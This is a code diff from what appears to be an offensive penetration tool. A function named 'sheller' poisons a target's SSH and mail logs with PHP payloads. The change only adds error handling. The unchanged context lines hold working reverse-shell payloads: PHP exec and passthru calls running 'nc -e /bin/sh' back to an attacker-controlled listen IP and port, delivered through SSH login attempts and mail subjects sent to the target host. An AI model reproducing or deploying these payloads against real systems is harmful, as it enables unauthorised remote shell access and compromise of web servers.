@@ -629,7 +629,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             '<?php exec("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host),
             '<?php passthru("nc -e /bin/sh {} {}"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
             for ssh in sshs:
-                subprocess.call(["ssh", ssh])
+                try:
+                    subprocess.call(["ssh", ssh])
+                except Exception as e:
+                    print("Technique " + technique + " failed: {}".format(e))
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
@@ -643,8 +646,11 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             'I<3shells <?php passthru("nc -e /bin/sh {} {}"); ?>'.format(LISTENIP, LISTENPORT)]
             host = tmp.split("/")[0].split(":")[0]
             for topic in topics:
-                p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
-                subprocess.call(["mail", "-s", topic, "www-data@{}".format(host)], stdin=p.stdout)
+                try:
+                    p = subprocess.Popen(["echo", "Uno reverse shell"], stdout=subprocess.PIPE)
+                    subprocess.call(["mail", "-s", topic, "www-data@{}".format(host)], stdin=p.stdout)
+                except Exception as e:
+                    print("Technique " + technique + " failed: {}".format(e))
             try:
                 s.send(prep, timeout=timeout)
             except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
